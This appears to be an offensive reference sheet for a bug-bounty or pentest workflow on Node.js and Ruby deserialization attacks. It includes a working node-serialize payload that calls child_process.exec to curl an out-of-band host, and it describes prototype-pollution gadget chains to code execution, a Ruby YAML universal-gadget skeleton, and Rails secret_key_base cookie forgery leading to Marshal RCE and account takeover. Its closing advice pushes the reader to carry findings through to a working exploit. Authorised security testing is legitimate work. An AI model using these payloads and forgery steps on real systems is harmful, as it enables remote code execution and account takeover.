# Node.js / Ruby Deserialization Reference

Use for Node object loaders, prototype-pollution gadgets, Ruby Marshal/YAML, and
Rails signed cookies. Impact-first: forge with a leaked `secret_key_base`; the
`_$$ND_FUNC$$_` reflection / `Psych` error is the positive oracle. For Next.js RSC
(the biggest Node deser play) use `../../_shared/references/nextjs-rsc-deser.md`.

## Node markers

- `node-serialize`, `_$$ND_FUNC$$_`, function-strings inside serialized JSON.
- `serialize-javascript`, `funcster`, `cryo`, `devalue`, `flatted`,
  `class-transformer`, `reviver`.
- JSON with `__proto__` / `constructor` / `prototype` keys (prototype pollution).

## node-serialize / funcster -> RCE (CVE-2017-5941)

`unserialize()` from the `node-serialize` package evaluates an
IIFE-tagged function:
```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://<id>.oob',function(){});}()"}
```
The trailing `()` makes it self-invoke on deserialize. OOB callback = RCE proof.
Oracle: a `_$$ND_FUNC$$_`-tagged value reflected/stored confirms the package.

## Prototype pollution -> gadget chain

`__proto__`/`constructor.prototype` keys reaching a recursive merge/`_.set`/query
parser pollute `Object.prototype`. On its own it's account-local; the payable path
is a **gadget** — a downstream sink that reads a polluted property and reaches
exec/template. Real chains:
- pollute a property consumed by a template engine (`lodash.template`, EJS, Pug,
  Handlebars options) -> SSTI -> RCE.
- pollute `child_process` spawn options (`shell`, `NODE_OPTIONS`,
  `--experimental-...`) -> command injection.
- Next.js RSC uses exactly this: prototype-pollution gadget in the React
  deserializer -> `child_process.execSync` (see the shared Next.js reference).

Prove with a benign marker property first (own-account, harmless), then the sink.
Kortix/CVE-stream examples: `AST injection` in template compilers.

## Ruby markers

- Marshal: base64 `BAh...`.
- YAML: `!ruby/object`, `!ruby/object:`, `!ruby/hash`, `Psych` parser errors.
- Rails signed/encrypted cookie `_<app>_session`, `ActiveSupport::MessageVerifier`
  / `MessageEncryptor` errors; ActiveJob/Sidekiq class+args.

## Ruby Marshal / YAML -> RCE (universal gadget)

If untrusted data reaches `Marshal.load` / `YAML.load`(`Psych` pre-safe) /
`JSON.load`, the public Ruby universal deserialization gadget (Gem/`Net::` chain by
@elttam / the `Gem::Requirement` + `Gem::Package::TarReader` chain) reaches RCE:
```yaml
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  specs:
  - !ruby/object:Gem::Source::SpecificFile
    # ... universal RCE gadget (use the current published chain for the Ruby version)
```
> **Tooling:** the Ruby gadget generators (`universal_deserialization_gadget`,
> the `ysoserial` Ruby fork) are **not installed on this host**; `ruby` itself is
> (`ruby`, on PATH), so a cloned generator runs immediately. The oracle below needs
> nothing at all — send an object tag and read the error.

Oracle: a `Psych::DisallowedClass` or object-tag error confirms a rich (non-safe)
loader.

## Rails — secret_key_base cookie forge -> Marshal RCE

Leaked `secret_key_base` (`credentials.yml.enc`+`master.key`, `secrets.yml`, env,
or the Rails dev-mode default, CVE-2019-5420, Rails <5.2.2.1 and <6.0.0.beta3,
development mode only) -> decrypt+forge the session cookie.
`:marshal` serializer or `CVE-2020-8165` (`Marshal.load` on cache/`raw`) -> RCE.
Full steps in `leaked-key-forge.md` (Rails section). Even with the JSON serializer,
forging a session (`user_id`, `admin`) with the key is ATO.

## Evidence that converts

- OOB callback from `node-serialize` `_$$ND_FUNC$$_`, a prototype-pollution->SSTI
  chain, or a Ruby Marshal/YAML universal gadget = RCE.
- Next.js RSC `500`-body oracle + benign `id` in `digest` = unauth RCE (shared ref).
- Forged Rails session with leaked `secret_key_base` accepted = ATO (Marshal -> RCE).
- `_$$ND_FUNC$$_` reflected / `Psych::DisallowedClass` naming your input = confirmed.

Do NOT stop at "it's a signed cookie" or "prototype pollution, account-local" —
decode/forge the cookie, and chase the pollution to a real gadget sink.
